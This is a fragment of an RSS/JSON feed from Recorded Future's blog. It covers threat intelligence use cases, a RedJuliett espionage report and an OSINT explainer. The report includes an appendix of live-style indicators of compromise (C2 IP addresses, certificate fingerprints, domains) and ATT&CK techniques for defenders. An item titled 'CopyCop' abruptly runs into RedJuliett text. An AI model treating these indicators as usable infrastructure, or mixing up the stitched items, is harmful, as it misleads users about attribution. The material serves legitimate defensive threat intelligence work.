exploit as long as it continues to provide results.</p><p>In its analysis of vulnerabilities discovered over the last decade, Gartner found that <a href=\"https://www.recordedfuture.com/vulnerability-database\">new CVEs</a> were found at a mostly steady rate, while the number of exploits grew exponentially over the same period. This indicates that the vast majority of new exploits were variations on old ones  making it clear that any organizations top priority should be patching already-known vulnerabilities rather than worrying about new threats.</p><h3 id=\"3-open-deep-and-dark-web-monitoring\">3. Open, Deep, and Dark Web Monitoring</h3><p>A <a href=\"https://www.recordedfuture.com/products/threat-intelligence\">threat intelligence solution</a> should gather its threat data from both open and closed sources on the internet.</p><p>Open sources, in short, are publicly available to everyone on the internet. This includes all the data that is indexed on search engines, which is sometimes called the surface web. Although this comprises some 4.56 billion pages, the public part of the internet only makes up about four percent of all data online.</p><p>The other 96 percent is divided between the deep web and the dark web. The deep web, which makes up about 90 percent of that data, refers to those parts of the internet that are locked away behind secure logins or paywalls, leaving them out of the reach of search engine crawlers. Most of this information includes scientific, academic, or government reports, personal information like financial records or medical histories, and private company databases.</p><p>The dark web, which makes up the remaining six percent of all the data on the internet, is made up of websites that can only be reached through browsers like Tor, which provide encryption and anonymity. Although this is not exclusively the case, many websites provide marketplaces for illegal goods and services.</p><p><a href=\"https://recordedfuture.com/cvss-score-vulnerabilities\">Vulnerabilities and their exploits</a> are commonly discussed and traded in spaces on both the dark and deep web, both by parties that would wish to keep them safe, and by threat actors. That makes it essential to gather threat data from these <a href=\"https://www.recordedfuture.com/threat-intelligence-101/intelligence-sources-collection/threat-intelligence-sources\">threat intelligence sources</a> to maintain a more comprehensive and up-to-date picture of what threats are out there.</p><p>Because accessing these spaces requires more skill and comes with higher risks, one of the principal values of certain threat intelligence solutions is that they will do it for you. According to <a href=\"https://www.gartner.com/en/documents/5037731\">Gartners Market Guide</a>, it can take many years of experience to effectively infiltrate these spaces and provide effective and timely analysis, and the most effective threat intelligence program will come with expert analysis that cannot be replicated by any algorithm.</p><h3 id=\"4-brand-monitoring\">4. Brand Monitoring</h3><p>Although discussions about vulnerabilities and exploits will mostly take place in the closed parts of the internet, there is still great value in choosing an actionable threat intelligence platform that will monitor open sources as well, particularly for emerging <a href=\"https://www.recordedfuture.com/threat-intelligence-101/intelligence-sources-collection/social-media-threat-intelligence\">cyber threats on social media channels</a>. Identifying threats in this arena is a skill in itself, requiring an awareness of your organizations brand and the many ways a threat actor may seek to exploit it.</p><p>Because these threats appear in public spaces and are subject to wider scrutiny, they can be more subtle, often relying on social engineering techniques instead of software exploits, and take a degree of expertise to recognize.</p><p>For example, a <a href=\"https://www.recordedfuture.com/products/brand-intelligence\">threat intelligence solution that includes brand monitoring</a> may look for fake or malicious social media profiles that have been accepted by your staff or even mimic your staffs profiles, identify malicious links that have been posted to your social media profiles, or even evaluate intellectual property loss and theft.</p><p>Cyber attacks that can be identified through social media and brand monitoring include phishing, false flag schemes, domain fraud, or activist or trolling attacks. Professionally developed threat intelligence solutions are much more efficient and will generate fewer false positives than open-source tools or ad hoc approaches.</p><h3 id=\"5-threat-indicator-investigation-enrichment-and-response\">5. Threat Indicator Investigation, Enrichment, and Response</h3><p>Not every attack can be prevented, of course, and one of the values of many threat intelligence solutions is their ability to improve the speed and accuracy of your incident response through operational threat intelligence. In its guide, Gartner advocates shifting away from focusing on prevention toward a more balanced approach that also equally includes both <a href=\"https://www.recordedfuture.com/blog/incident-response-information\">threat detection and response</a>.</p><p>Part of this framework includes rethinking how to prioritize vulnerabilities, as detailed above. It can also be helpful to have a threat intelligence solution that allows on-demand access to submit files or objects and looks for indicators of compromise like suspicious file hashes, domain names, or addresses, and compares them to the large datasets that some solutions maintain, enriching your organizations data.</p><p>Some solutions even have the ability to go on the hunt for threats proactively. Whereas incident response is, by definition, a reactive process, more advanced solutions can seek out threats before they are actually implemented against your organization.</p><p><a href=\"https://recordedfuture.com/blog/cyber-threat-hunting\">Threat hunting</a> takes a mature organization that already maintains the fundamentals of its security stance, like keeping its systems up to date and closely monitoring its own network, but provides an invaluable additional layer of security for those organizations that can do it effectively.</p><h2 id=\"another-framework-for-evaluating-use-cases\">Another Framework for Evaluating Use Cases</h2><p>Gartners Market Guide also provides an easy way to evaluate different threat intelligence services based on where they fall on two scales:</p><p><img src=\"https://cms.recordedfuture.com/uploads/threat_intelligence_use_cases_1_ce5cbae3ff_29f1a5614a.webp\" alt=\"Threat Intel Use Cases Examples by Time Frame or Type of Risk\"></p><ul><li><strong>Tactical - Strategic</strong>: This scale is a measurement of time. In rough terms, a tactical threat intelligence solution may be more effective in the short term, while a strategic solution will be better in the long term. For example, a solution might be considered more tactical if its strengths lie in its ability to quickly process threat data and identify potential threats, whereas a solution that offers a deeper analysis that lends itself to long-term planning for the future could better be defined as strategic.</li><li><strong>Technical - Business</strong>: This scale is a measurement of risk type. In general terms, a technical threat intelligence solution will be more focused on security operations, while a strategic threat intelligence approach will deal with <a href=\"https://www.recordedfuture.com/solutions/digital-risk\">digital risk management</a>. For example, a more technical solution might focus on indicators of immediate compromise like bad IP addresses or domains, but a solution that measures the risk from an emerging tactic or to a particular industry vertical is more aligned with business risk.</li></ul><h2 id=\"implementing-cyber-threat-intelligence-is-necessary\">Implementing Cyber Threat Intelligence Is Necessary</h2><p>Incorporating threat intelligence into an organization&#39;s cybersecurity strategy is crucial for staying ahead of evolving cyber threats. The implementation of threat intelligence solutions is crucial for organizations looking to strengthen their cybersecurity posture (or their security teams) and defend against increasingly sophisticated cyber threats.</p><p>Threat intelligence provides the actionable insights needed to anticipate, identify, and respond to threats, ensuring that security teams are always one step ahead of cyber adversaries. Organizations can proactively protect their assets, reduce risk, and ensure a more secure digital environment by leveraging threat intelligence for various use cases, such as enhancing incident response, proactive threat hunting, vulnerability management, and more.</p><p>To discover how threat intelligence can enhance your cybersecurity strategy and security teams, <a href=\"https://go.recordedfuture.com/demo?utm_campaign=rf-blog-bottom-book-a-demo-text-cta&utm_source=recordedfuture&utm_medium=webiste&utm_content=rf-blog-bottom-book-a-demo-text-cta&utm_term=rf-blog-bottom-book-a-demo-text-cta\">request a demo from Recorded Future</a></p><br><p><em>This article was originally published January 23, 2018, and last updated on Jun 25, 2024.</em></p>","content:encodedSnippet":"Cyber threats are becoming increasingly sophisticated and frequent, making it imperative for organizations to leverage cyber threat intelligence to stay ahead of potential cyber attacks.

It involves a multi-faceted approach that ensures the collected information is relevant, accurate, and actionable. Here are several key components:\n\nData Collection: Gathering raw data from various sources, including network logs, security incidents, and external threat intel feeds.\nData Analysis: Processing and analyzing the collected data to identify patterns, trends, and indicators of potential threats.\nDissemination: Sharing the analyzed intelligence with relevant stakeholders within the organization to inform security decisions and actions.\nActionable Insights: Turning the analyzed data into actionable insights that can be used to mitigate risks and enhance security measures.\n\nHow Can Threat Intelligence Use Cases Help Organizations Against Cyber Threats?\nThreat intelligence plays a pivotal role in helping organizations defend against the ever-evolving landscape of emerging cyber threats. Because threat intelligence solutions can be used in a wide variety of ways, it is important to identify your potential use cases before you choose a threat intelligence platform, rather than picking a solution and then trying to conform your use cases to the strengths of that solution.\nThreat intelligence use cases can streamline the incident response process. In its recent Market Guide, the technology research company Gartner suggests that end users of cyber threat intelligence solutions identify their best solution by taking a use-case-centric approach.\nFor example, you may wish to gain insights into the identity, methods, and motives of threat actors targeting you so that you can avoid future threats and adjust or update your security; you may wish to create case studies for use in training exercises; or you may wish to gather more threat data so that you can prioritize vulnerability management based on the risks that your organization is particularly vulnerable to  Gartner provides a long list of possible use cases that are important to consider before choosing a solution.\nBefore making expensive and informed security decisions on how to improve your security operations and programs, review Gartners five examples below on the most effective uses of threat intelligence platforms.\n\n\n\n1. Enriching Other Security Technologies by Integrating Threat Intelligence\nThese are the basics  integrating cyber threat intelligence into your already existing security processes improves decision-making for incident response and enhances your security policy. According to Gartner, cyber threat intelligence has recently begun to be widely incorporated into most security technology verticals, including security information and event management (SIEM), firewalls and unified threat management systems, intrusion detection and prevention, secure web gateways and secure email gateways, endpoint protection, web application protection, distributed denial of service, vulnerability management, security orchestration, and more.\nIf your organization does not already include threat intelligence in its security program, a good place to start is by looking at what you are already using and seeing how threat intelligence can make it more effective. Many threat intelligence solutions offer machine-readable intelligence that can integrate frictionlessly with the security products you already use, and an increasing number of solutions are using open-source standards, making it easier than ever to share data across platforms.\n2. Vulnerability Prioritization For Security Teams\nOne of the best uses for an effective threat intelligence program is to gather data and perform analysis that will help your organization create a simple metric for evaluating vulnerabilities. This metric should be a measure of the overlap between the problems you can fix and the solutions that will make the biggest difference, given the time and resources available to you.\nThe traditional approach to prioritizing vulnerabilities comes from the attitude that the best security approach is to patch everything, all the time, everywhere. Achieving this goal would, in theory, lead to a perfectly impenetrable system  but it sets an impossibly high standard. So organizations that follow this approach will inevitably make compromises and go after the biggest problems first.\nBut, contrary to popular belief, the biggest problems (based on how much damage they actually cause) are not issues like zero-day threats or clever new exploits, but the same old vulnerabilities that continue to be exploited, precisely because so many organizations prioritize new threats within their threat hunting instead of focusing on improving their fundamentals.\nThreat actors are just as limited  if not more so  by time and the resources available to them as you are. They naturally will tend to use the simplest, least resource-intensive exploit as long as it continues to provide results.\nIn its analysis of vulnerabilities discovered over the last decade, Gartner found that new CVEs were found at a mostly steady rate, while the number of exploits grew exponentially over the same period. This indicates that the vast majority of new exploits were variations on old ones  making it clear that any organizations top priority should be patching already-known vulnerabilities rather than worrying about new threats.\n3. Open, Deep, and Dark Web Monitoring\nA threat intelligence solution should gather its threat data from both open and closed sources on the internet.\nOpen sources, in short, are publicly available to everyone on the internet. This includes all the data that is indexed on search engines, which is sometimes called the surface web. Although this comprises some 4.56 billion pages, the public part of the internet only makes up about four percent of all data online.\nThe other 96 percent is divided between the deep web and the dark web. The deep web, which makes up about 90 percent of that data, refers to those parts of the internet that are locked away behind secure logins or paywalls, leaving them out of the reach of search engine crawlers. Most of this information includes scientific, academic, or government reports, personal information like financial records or medical histories, and private company databases.\nThe dark web, which makes up the remaining six percent of all the data on the internet, is made up of websites that can only be reached through browsers like Tor, which provide encryption and anonymity. Although this is not exclusively the case, many websites provide marketplaces for illegal goods and services.\nVulnerabilities and their exploits are commonly discussed and traded in spaces on both the dark and deep web, both by parties that would wish to keep them safe, and by threat actors. That makes it essential to gather threat data from these threat intelligence sources to maintain a more comprehensive and up-to-date picture of what threats are out there.\nBecause accessing these spaces requires more skill and comes with higher risks, one of the principal values of certain threat intelligence solutions is that they will do it for you. According to Gartners Market Guide, it can take many years of experience to effectively infiltrate these spaces and provide effective and timely analysis, and the most effective threat intelligence program will come with expert analysis that cannot be replicated by any algorithm.\n4. Brand Monitoring\nAlthough discussions about vulnerabilities and exploits will mostly take place in the closed parts of the internet, there is still great value in choosing an actionable threat intelligence platform that will monitor open sources as well, particularly for emerging cyber threats on social media channels. Identifying threats in this arena is a skill in itself, requiring an awareness of your organizations brand and the many ways a threat actor may seek to exploit it.\nBecause these threats appear in public spaces and are subject to wider scrutiny, they can be more subtle, often relying on social engineering techniques instead of software exploits, and take a degree of expertise to recognize.\nFor example, a threat intelligence solution that includes brand monitoring may look for fake or malicious social media profiles that have been accepted by your staff or even mimic your staffs profiles, identify malicious links that have been posted to your social media profiles, or even evaluate intellectual property loss and theft.\nCyber attacks that can be identified through social media and brand monitoring include phishing, false flag schemes, domain fraud, or activist or trolling attacks. Professionally developed threat intelligence solutions are much more efficient and will generate fewer false positives than open-source tools or ad hoc approaches.\n5. Threat Indicator Investigation, Enrichment, and Response\nNot every attack can be prevented, of course, and one of the values of many threat intelligence solutions is their ability to improve the speed and accuracy of your incident response through operational threat intelligence. In its guide, Gartner advocates shifting away from focusing on prevention toward a more balanced approach that also equally includes both threat detection and response.\nPart of this framework includes rethinking how to prioritize vulnerabilities, as detailed above. It can also be helpful to have a threat intelligence solution that allows on-demand access to submit files or objects and looks for indicators of compromise like suspicious file hashes, domain names, or addresses, and compares them to the large datasets that some solutions maintain, enriching your organizations data.\nSome solutions even have the ability to go on the hunt for threats proactively. Whereas incident response is, by definition, a reactive process, more advanced solutions can seek out threats before they are actually implemented against your organization.\nThreat hunting takes a mature organization that already maintains the fundamentals of its security stance, like keeping its systems up to date and closely monitoring its own network, but provides an invaluable additional layer of security for those organizations that can do it effectively.\nAnother Framework for Evaluating Use Cases\nGartners Market Guide also provides an easy way to evaluate different threat intelligence services based on where they fall on two scales:\n\n\nTactical - Strategic: This scale is a measurement of time. In rough terms, a tactical threat intelligence solution may be more effective in the short term, while a strategic solution will be better in the long term. For example, a solution might be considered more tactical if its strengths lie in its ability to quickly process threat data and identify potential threats, whereas a solution that offers a deeper analysis that lends itself to long-term planning for the future could better be defined as strategic.\nTechnical - Business: This scale is a measurement of risk type. In general terms, a technical threat intelligence solution will be more focused on security operations, while a strategic threat intelligence approach will deal with digital risk management. For example, a more technical solution might focus on indicators of immediate compromise like bad IP addresses or domains, but a solution that measures the risk from an emerging tactic or to a particular industry vertical is more aligned with business risk.\n\nImplementing Cyber Threat Intelligence Is Necessary\nIncorporating threat intelligence into an organization's cybersecurity strategy is crucial for staying ahead of evolving cyber threats. The implementation of threat intelligence solutions is crucial for organizations looking to strengthen their cybersecurity posture (or their security teams) and defend against increasingly sophisticated cyber threats.\nThreat intelligence provides the actionable insights needed to anticipate, identify, and respond to threats, ensuring that security teams are always one step ahead of cyber adversaries. Organizations can proactively protect their assets, reduce risk, and ensure a more secure digital environment by leveraging threat intelligence for various use cases, such as enhancing incident response, proactive threat hunting, vulnerability management, and more.\nTo discover how threat intelligence can enhance your cybersecurity strategy and security teams, request a demo from Recorded Future\n\nThis article was originally published January 23, 2018, and last updated on Jun 25, 2024.","enclosure":{"url":"https://cms.recordedfuture.com/uploads/threat_intelligence_use_cases_examples_d4190d3560.webp","length":"0","type":"image/webp"},"content":"Threat intelligence solutions can be used in a wide variety of ways, so it is important to identify your potential use cases before you choose one.","contentSnippet":"Threat intelligence solutions can be used in a wide variety of ways, so it is important to identify your potential use cases before you choose one.","guid":"https://www.recordedfuture.com/blog/threat-intelligence-use-cases","categories":["Blog"],"isoDate":"2024-06-25T00:00:00.000Z","tag":"intel"},{"title":"Russia-Linked CopyCop Expands to Cover US Elections, Target Political Leaders","link":"https://www.recordedfuture.com/research/copycop-expands-to-cover-us-elections-target-political-leaders","pubDate":"Mon, 24 Jun 2024 00:00:00 GMT","content:encoded":"<p><img src=\"https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png\" alt=\"insikt-group-logo-updated-3-300x48.png\"></p><p>Insikt Group&#39;s report reveals that CopyCop, a likely Russian government-aligned influence network, has shifted its focus to the 2024 US elections.

The group also targeted multiple critical technology companies, highlighting the strategic importance of this sector for Chinese state-sponsored threat actors.\n\nRecommendations for Organizations\nOrganizations likely to be targeted by RedJuliett should adopt the following measures:\n\nNetwork Segmentation: Practice network segmentation by isolating internet-facing services in a demilitarized zone (DMZ).\nSecurity Monitoring: Ensure security monitoring and detection capabilities for all external-facing services and devices. Monitor for follow-on activities such as the use of web shells, backdoors, or reverse shells and lateral movement within internal networks.\nReview Public Guidance: Review public guidance on mitigating common TTPs used by Chinese state-sponsored groups and Insikt Groups report on trends and recommendations for mitigating Chinese APT activity more broadly.\nRisk-Based Patching: Ensure a risk-based approach for patching vulnerabilities, prioritizing high-risk vulnerabilities and those being exploited in the wild, as identified by Recorded Future Vulnerability Intelligence.\nPrioritize RCE Vulnerabilities: Focus on addressing remote code execution (RCE) vulnerabilities in popular VPN, mail server, firewall, and load-balancing appliances, particularly F5 BIG-IP, Fortinet FortiGate, and ZyXEL ZyWALL devices.\nMalicious Traffic Analysis: Monitor Malicious Traffic Analysis (MTA) to proactively detect and alert on infrastructure communicating with known RedJuliett command-and-control (C2) IP addresses.\nMonitor Supply Chains: Use Recorded Future Third-Party Intelligence to monitor real-time output and identify suspected intrusion activities involving key vendors and partners.\nThreat Intelligence Extension: Install the Recorded Future Threat Intelligence Browser Extension for instant access to threat intelligence from any web-based resource, enabling faster alert processing within security information and event management (SIEM) and prioritizing vulnerabilities for patching.\n\nInsikt Group anticipates that RedJuliett and other Chinese state-sponsored threat actors will continue to target Taiwan for intelligence-gathering, focusing on universities, government organizations, think tanks, and technology companies. Chinese state-sponsored groups are expected to continue their reconnaissance and exploitation of public-facing devices, a tactic that has proven effective in scaling their operations to gain initial access to a broad range of global targets. \nTo read the entire analysis, click here to download the report as a PDF.\nAppendix A  Indicators of Compromise\n\nActive RedJuliett servers as of May 21, 2024:\n38.147.190[.]192 (since 2024-04-07)\n61.238.103[.]155 (since 2024-02-23)\n122.10.89[.]230 (since 2024-01-24)\n137.220.36[.]87 (since 2024-05-09)\n140.120.98[.]115 (since 2023-11-14)\n154.197.98[.]3 (since 2023-11-14)\n154.197.99[.]202 (since 2023-12-16)\n176.119.150[.]92 (since 2024-04-01)\n    \nKnown RedJuliett SoftEther TLS Certificates (SHA-1 Fingerprint)\n7992c0a816246b287d991c4ecf68f2d32e4bca18\n5437d0195c31bf7cedc9d90b8cb0074272bc55df\ncc1f0cdc131dfafd43f60ff0e6a6089cd03e92f1\n2c95b971aa47dc4d94a3c52db74a3de11d9ba658\n0cc0ba859981e0c8142a4877f3af99d98dc0b707\n9f01fc7cad8cdd8d934e2d2f033d7199a5e96e4a\n    \nDomains:\ncktime.ooguy[.]com\nwww.sofeter[.]ml\nwww.dns361[.]tk\n\n\n            \n\n\nAppendix B  Mitre ATT&CK Techniques\n  \n   Tactic: Technique   ATT&CK Code  \n  \n   Resource Development: Acquire Infrastructure: Virtual Private Server   T1583.003  \n    \n   Resource Development: Compromise Infrastructure: Server   T1584  \n    \n   Reconnaissance: Active Scanning: Vulnerability Scanning   T1595.002  \n    \n   Initial Access: Exploit Public-Facing Application   T1190  \n    \n   Persistence: External Remote Services   T1133  \n    \n   Persistence: Server Software Component: Web Shell   T1505.003  \n    \n   Privilege Escalation: Exploitation for Privilege Escalation   T1068","enclosure":{"url":"https://cms.recordedfuture.com/uploads/format_webp/Main_Feature_3_bd7019d822.jpg","length":"0","type":"image/jpg"},"content":"Discover how RedJuliett, a Chinese state-sponsored group, targets Taiwan's government, academia, and tech sectors via network perimeter exploitation.","contentSnippet":"Discover how RedJuliett, a Chinese state-sponsored group, targets Taiwan's government, academia, and tech sectors via network perimeter exploitation.","guid":"https://www.recordedfuture.com/research/redjuliett-intensifies-taiwanese-cyber-espionage-via-network-perimeter","categories":["Research (Insikt)"],"isoDate":"2024-06-24T00:00:00.000Z","tag":"intel"},{"title":"What Is Open Source Intelligence (OSINT)?","link":"https://www.recordedfuture.com/blog/open-source-intelligence-definition","pubDate":"Mon, 24 Jun 2024 00:00:00 GMT","content:encoded":"<p><strong>Open Source Intelligence (OSINT) is the practice of gathering, analyzing, and disseminating information from publicly available sources to address specific intelligence requirements</strong>.</p><p>Of all the <a href=\"https://recordedfuture.com/threat-intelligence\">threat intelligence</a> subtypes, open source intelligence (OSINT) is perhaps the most widely used, which makes sense.

(Open Source Intelligence)\"></p><br><p>Crucially, open source information is not limited to what you can find using the major search engines. Web pages and other resources that can be found using Google certainly constitute massive sources of open source information, but they are far from the only sources.</p><p>For starters, a huge proportion of the internet (<a href=\"https://youtube.com/watch?v=_V8MGzvJEXY\">over 99 percent, according to former Google CEO Eric Schmidt</a>) cannot be found using the major search engines. This so-called deep web is a mass of websites, databases, files, and more that (for a variety of reasons, including the <a href=\"https://www.recordedfuture.com/blog/dangers-of-exposed-login-panels\">presence of login pages</a> or paywalls) cannot be indexed by Google, Bing, Yahoo, or any other search engine you care to think of. Despite this, much of the content of the deep web can be considered open source because its readily available to the public.</p><p><strong>OSINT tools can be used to access and analyze information from sources beyond traditional search engines</strong>. These tools, such as Spiderfoot, searchcode, Searx, Twint, and Metagoofil, gather and analyze massive amounts of data from public and open sources, including social media networks and the deep web, to discover and store large quantities of data, find links and patterns among different pieces of information, and collate discovered information into actionable intelligence.</p><p>In addition, <strong>theres plenty of freely accessible information online that can be found using online tools other than traditional search engines</strong>. Well look at this more later on, but as a simple example, tools like <a href=\"https://securitytrails.com/\">SecurityTrails</a> and others can be used to find IP addresses, networks, open ports, webcams, printers, and pretty much anything else thats connected to the internet.</p><p><strong>Information can also be considered open source if it is:</strong></p><ul><li>Published or broadcast for a public audience (for example, news media content)</li><li>Available to the public by request (for example, census data)</li><li>Available to the public by subscription or purchase (for example, industry journals)</li><li>Could be seen or heard by any casual observer</li><li>Made available at a meeting open to the public</li><li>Obtained by visiting any place or attending any event that is open to the public</li></ul><p>At this point, youre probably thinking, Man, thats a lot of information </p><p>And youre right. Were talking about a truly unimaginable quantity of information that is growing at a far higher rate than anybody could ever hope to keep up with. Even if we narrow the field down to a single source of information  lets say Twitter  were forced to cope with <a href=\"http://internetlivestats.com/\">hundreds of millions of new data points every day</a>.</p><p>This, as youve probably gathered, is the inherent trade-off of open source intelligence.</p><h2 id=\"history-of-osint\">History of OSINT</h2><p>The term OSINT refers to the practice of collecting information from <a href=\"https://osintfoundation.com/osint/Standards.asp\">publicly available sources</a> to be used in an intelligence context. This practice has been around for a while, but its the digital era that really propelled OSINT into a league of its own.</p><p><strong>The foundational roots of OSINT are linked to the formation of the <a href=\"https://cia.gov/readingroom/sites/default/files/FBIS_history_part1_0.pdf\">Foreign Broadcast Monitoring Service (FBMS) back in 1941</a></strong>. This organization was charged with the significant role of scrutinizing international broadcast communications to identify any potential dubious activities.</p><p><a href=\"https://afio.com/publications/Schauer_Storger_Evo_of_OSINT_WINTERSPRING2013.pdf\">According</a> to the Association of Former Intelligence Officers (AFIO): <strong>The US military first coined the term OSINT in the late 1980s.</strong> This development stemmed from the recognition that intelligence reform was needed to effectively meet the rapidly changing informational demands, particularly at the tactical battlefield level.</p><p>Initially, OSINT was a tool used primarily by intelligence agencies and law enforcement to gather publicly available information to assist in national security and <a href=\"https://www.recordedfuture.com/threat-intelligence-101/threat-actors/cybercriminals\">cybercriminal</a> investigations. The methods involved were time-consuming, often requiring individuals to manually sift through public records, newspapers, and other documents to find relevant information. This manual gathering of information was often difficult due to the vast amount of data one had to sift through. However, <strong>as the web evolved, so did the methods of collecting and analyzing publicly available data</strong>.</p><p>The advent of the internet significantly amplified the means through which information could be collected. <strong>Suddenly, a wide range of data became publicly available and easily accessible online, from government reports to academic papers, and everything in-between</strong>. Websites became a primary data source for OSINT practitioners. These developments led to a boom in the creation of <a href=\"https://recordedfuture.com/threat-intelligence-101/tools-and-technologies/osint-tools\">OSINT tools</a> designed to automate the process of data collection and analysis. These tools could quickly gather information from various sources, including publicly accessible databases, social media platforms, and many other tools available in the digital realm.</p><p><strong>As the field of cybersecurity experienced rapid growth, the application of OSINT expanded. Cybersecurity professionals began to see the value in utilizing OSINT to identify vulnerabilities, assess potential security threats, and bolster organizational security</strong>. OSINT tools became essential in monitoring publicly accessible web servers, analyzing metadata, and assessing security vulnerabilities. The data gathered became invaluable in understanding the security posture of an organization, identifying potential threats, and developing strategies to mitigate risks.</p><p>One notable trend is <strong>the integration of machine learning and analytics in OSINT tools to enhance the process of identifying patterns and trends from the collected data</strong>. This integration has not only made OSINT tools more effective but has also expanded the range of applications in which they can be utilized. For instance, security researchers now use OSINT to perform penetration tests, while businesses use it to gain insights into their competitors and the market environment.</p><p>Moreover, <strong>the community of OSINT researchers has grown over time, with forums, conferences, and groups forming to share knowledge, discuss best practices, and develop new OSINT techniques</strong>. Many OSINT tools, including frameworks like Recon-ng, have communities of developers on platforms like GitHub, working to improve, customize, and create modules to extend the capabilities of these tools. The collective effort of these communities has played a significant role in refining the OSINT practice, making it a vital component in intelligence gathering and cybersecurity.</p><h2 id=\"how-is-open-source-intelligence-used\">How Is Open Source Intelligence Used?</h2><p>Now that weve covered the basics of open source intelligence, we can look at <a href=\"https://recordedfuture.com/blog/open-source-intelligence-future\">how it is commonly used for cybersecurity</a>. The intelligence community plays a crucial role in utilizing OSINT for national security and cybersecurity efforts. </p><br><p><img src=\"https://cms.recordedfuture.com/uploads/osint_how_is_open_source_intelligence_used_991120581e.webp\" alt=\"How is Open Source Intelligence Used?\"></p><br><p>There are two common use cases:</p><h3 id=\"1-ethical-hacking-and-penetration-testing\">1. Ethical Hacking and Penetration Testing</h3><p>Security professionals use open source intelligence to identify potential weaknesses in friendly networks so that they can be remediated before they are exploited by threat actors. Commonly found weaknesses include:</p><ul><li>Accidental leaks of sensitive data, like through <a href=\"https://recordedfuture.com/blog/social-media-threat-intelligence\">social media</a>. Identifying and protecting sensitive data is crucial to reduce the risk of cybersecurity threats.</li><li>Open ports or unsecured internet-connected devices</li><li>Unpatched software, such as websites running old versions of common CMS products</li><li>Leaked or exposed assets, such as proprietary code on pastebins</li></ul><h3 id=\"2-identifying-external-threats\">2. Identifying External Threats</h3><p>As weve discussed many times in the past, the internet is an excellent source of insights into an organizations most pressing <a href=\"https://recordedfuture.com/threat-intelligence-101/cyber-threats/emerging-threats\">emerging threats</a>. From identifying which new <a href=\"https://recordedfuture.com/blog/exploiting-old-vulnerabilities\">vulnerabilities are being actively exploited</a> to intercepting threat actor chatter about an upcoming attack, open source intelligence enables security professionals to prioritize their time and resources to address the most significant current threats.</p><p>In most cases, this type of work requires an analyst to identify and correlate multiple data points to validate a threat before action is taken. OSINT tools are used to gather and analyze data from public and open sources, including social media networks and the deep web, to identify and correlate multiple data points for threat validation. For example, while a single threatening tweet may not be cause for concern, that same tweet would be viewed in a different light if it were tied to a threat group known to be active in a specific industry.</p><p>One of the most important things to understand about open source intelligence is that it is often used in combination with other intelligence subtypes. Intelligence from closed sources such as internal telemetry, closed <a href=\"https://recordedfuture.com/blog/dark-web-networks\">dark web communities</a>, and external intelligence-sharing communities is regularly used to filter and verify open source intelligence. There are a variety of tools available to help analysts perform these functions, which well look at a bit later on.</p><h2 id=\"the-dark-side-of-open-source-intelligence\">The Dark Side of Open Source Intelligence</h2><p>At this point, its time to address the second major issue with open source intelligence: <strong>if something is readily available to intelligence analysts, its also readily available to threat actors.</strong></p><p><strong>Threat actors use open source intelligence tools and techniques to identify potential targets and exploit weaknesses in target networks.</strong> Once a vulnerability is identified, it is often an <a href=\"https://hackernoon.com/how-i-hacked-40-websites-in-7-minutes-5b4c28bc8824\">extremely quick and simple process</a> to exploit it and achieve a variety of malicious objectives. They also seek out sensitive data that can be exploited for malicious purposes, such as launching targeted attacks or selling the information on the dark web.</p><p>This process is the main reason why so many small and medium-sized enterprises get hacked each year. It isnt because threat groups specifically take an interest in them, but rather because vulnerabilities in their network or website architecture are found using simple open source intelligence techniques. In short, they are easy targets.</p><p>And open source intelligence doesnt only enable technical attacks on IT systems and networks. <strong>Different <a href=\"https://www.recordedfuture.com/threat-intelligence-101/threat-actors/threat-actor-types\">types of threat actors</a> also seek out information about individuals and organizations that can be used to inform sophisticated social engineering campaigns using <a href=\"https://recordedfuture.com/blog/podcast-episode-31\">phishing</a> (email), vishing (phone or voicemail), and SMiShing (SMS).</strong> Often, seemingly innocuous information shared through social networks and blogs can be used to develop highly convincing social engineering campaigns, which in turn are used to trick well-meaning users into compromising their organizations network or assets.</p><p>This is why using open source intelligence for security purposes is so important  It gives you an opportunity to find and fix weaknesses in your organizations network and remove sensitive information <em>before</em> a threat actor uses the same tools and techniques to exploit them.</p><h2 id=\"open-source-intelligence-techniques-and-osint-tools\">Open Source Intelligence Techniques and OSINT Tools</h2><p>Now that weve covered the uses of open source intelligence (both good and bad) its time to look at some of the techniques that can be used to gather and process open source information.</p><br><p><img src=\"https://cms.recordedfuture.com/uploads/osint_techniques_c41b559086.webp\" alt=\"OSINT Techniques\"></p><br><p>First, <strong>you must have a clear strategy and <a href=\"https://recordedfuture.com/blog/analytical-threat-intelligence-frameworks\">framework</a> in place for acquiring and using open source intelligence. Its not recommended to approach open source intelligence from the perspective of finding anything and everything that might be interesting or useful</strong>  as weve already discussed, the sheer volume of information available through open sources will simply overwhelm you.</p><p>It is also crucial to select the right OSINT tool for your specific intelligence gathering goals. These tools, such as Spiderfoot, searchcode, Searx, Twint, and Metagoofil, can help discover and store large quantities of data, find links and patterns among different pieces of information, and collate discovered information into actionable intelligence.</p><p>Instead, <strong>you must know exactly what youre trying to achieve</strong>  for example, to identify and remediate weaknesses in your network  and focus your energies specifically on accomplishing those goals.</p><p>Second, <strong>you must identify a set of tools and techniques for collecting and processing open source information</strong>. Once again, the volume of information available is much too great for manual processes to be even slightly effective.</p><h3 id=\"passive-vs-active-osint\">Passive vs. Active OSINT</h3><p>Broadly speaking, collection of open source intelligence falls into two categories: passive collection and active collection.</p><p><strong>Passive collection</strong> often involves the use of <a href=\"https://recordedfuture.com/blog/threat-intelligence-platform\">threat intelligence platforms (TIPs)</a> to combine a variety of <a href=\"https://www.recordedfuture.com/threat-intelligence-101/intelligence-sources-collection/threat-intelligence-feeds\">threat feeds</a> into a single, easily accessible location. While this is a major step up from manual intelligence harvesting, the risk of information overload is still significant.</p><p>More advanced threat intelligence solutions like Recorded Future solve this problem by using artificial intelligence, <a href=\"https://recordedfuture.com/blog/machine-learning-threat-intelligence\">machine learning</a>, and natural language processing to automate the process of prioritizing and dismissing alerts based on an organizations specific needs. Additionally, using an OSINT tool can further streamline this process by gathering and analyzing massive amounts of data from public and open sources, <a href=\"https://www.recordedfuture.com/threat-intelligence-101/intelligence-sources-collection/social-media-threat-intelligence\">including social media networks</a> and the deep web.</p><p>In a similar manner, organized threat groups often use botnets to collect valuable information using techniques like traffic sniffing and keylogging.</p><p><strong>Active collection</strong> is the use of a variety of techniques to search for specific insights or information. For security professionals, this type of collection work is usually done for one of two reasons:</p><ol><li>A passively collected alert has highlighted a potential threat and further insight is required.</li><li>The focus of an intelligence gathering exercise is very specific, such as a penetration testing exercise.</li></ol><p>To close things out, well take a look at some of the most commonly used tools for collecting and processing open source intelligence.</p><p>While there are many free and useful tools available to security professionals and threat actors alike, 